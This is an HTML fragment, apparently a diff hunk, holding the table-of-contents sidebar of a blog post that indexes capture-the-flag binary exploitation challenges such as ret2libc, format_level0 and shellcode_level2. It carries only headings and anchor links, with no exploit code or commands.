       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#baby-calculator"><span class="nav-number">1.</span> <span class="nav-text">baby_calculator</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#changeable-shellcode"><span class="nav-number">2.</span> <span class="nav-text">changeable_shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fd"><span class="nav-number">3.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#format-level0"><span class="nav-number">4.</span> <span class="nav-text">format_level0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#format-level1"><span class="nav-number">5.</span> <span class="nav-text">format_level1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#int-overflow"><span class="nav-number">6.</span> <span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#little-canary"><span class="nav-number">7.</span> <span class="nav-text">little_canary</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PIE-enabled"><span class="nav-number">8.</span> <span class="nav-text">PIE_enabled</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rePWNse"><span class="nav-number">9.</span> <span class="nav-text">rePWNse</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-number">10.</span> <span class="nav-text">ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-number">11.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text-32"><span class="nav-number">12.</span> <span class="nav-text">ret2text_32</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text-64"><span class="nav-number">13.</span> <span class="nav-text">ret2text_64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode-level1-md"><span class="nav-number">14.</span> <span class="nav-text">shellcode_level1.md</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode-level2"><span class="nav-number">15.</span> <span class="nav-text">shellcode_level2</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
